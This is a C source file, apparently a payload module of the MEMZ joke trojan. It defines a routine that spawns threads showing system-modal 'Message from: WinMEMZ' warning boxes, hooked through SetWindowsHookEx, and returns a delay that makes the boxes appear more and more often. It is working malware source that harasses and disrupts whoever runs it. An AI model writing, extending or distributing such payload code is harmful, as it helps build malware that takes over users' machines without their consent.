#include "../MEMZ.h"

DWORD WINAPI messageBoxThread(LPVOID);

PAYLOADFUNCTIONDEFAULT(payloadMessageBox) {
	PAYLOADHEAD

	CreateThread(NULL, 4096, &messageBoxThread, NULL, 0, NULL);

	out: return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
}

DWORD WINAPI messageBoxThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, L"Keep your PC on for the best experience! :D", L"Message from: WinMEMZ", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hook);

	return 0;
}
